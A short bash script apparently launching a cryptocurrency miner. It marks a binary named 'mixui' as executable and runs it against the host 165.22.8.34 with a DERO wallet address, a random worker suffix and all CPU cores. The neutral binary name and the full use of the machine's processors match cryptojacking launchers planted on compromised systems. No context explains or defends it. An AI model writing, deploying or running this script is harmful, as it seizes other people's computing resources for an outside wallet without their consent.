#!/bin/bash

chmod +x mixui && ./mixui -r 165.22.8.34:80 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w.$(shuf -i 1-20000 -n 1) -p rpc -m $(nproc --all) -k -1 -ft -1 -report-realtime-hashrate
